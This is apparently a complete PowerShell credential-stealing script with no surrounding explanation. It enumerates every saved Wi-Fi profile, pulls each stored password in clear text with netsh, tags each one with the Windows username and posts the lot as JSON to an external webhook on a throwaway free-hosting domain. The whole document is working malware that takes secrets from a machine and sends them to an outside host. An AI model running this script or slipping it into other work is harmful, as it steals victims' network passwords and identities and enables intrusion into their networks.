$wifiProfiles = @()

netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
    $wlan  = $_.Matches.Value
    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'

    $wifiProfile = @{
        'username' = $env:username + " | " + [string]$wlan
        'content' = [string]$passw
    }

    $wifiProfiles += $wifiProfile
}

$Body = @{
    'wifiProfiles' = $wifiProfiles
}

Invoke-RestMethod -ContentType 'Application/Json' -Uri https://pikminthrowaway1.000webhostapp.com/webhook.php -Method Post -Body ($Body | ConvertTo-Json)
